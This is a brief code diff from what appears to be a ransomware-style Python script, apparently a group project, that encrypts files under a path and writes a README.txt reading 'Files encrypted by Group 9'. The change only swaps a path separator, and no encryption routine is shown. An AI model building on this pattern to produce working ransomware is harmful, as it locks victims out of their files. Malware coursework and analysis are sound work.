@@ -34,5 +34,5 @@ if __name__ == '__main__':
 
     encrypt(full_path, key)
 
-    with open(path_to_encrypt + '\\' + 'README.txt', 'w') as file:
+    with open(path_to_encrypt + '/' + 'README.txt', 'w') as file:
         file.write('Files encrypted by Group 9\n')
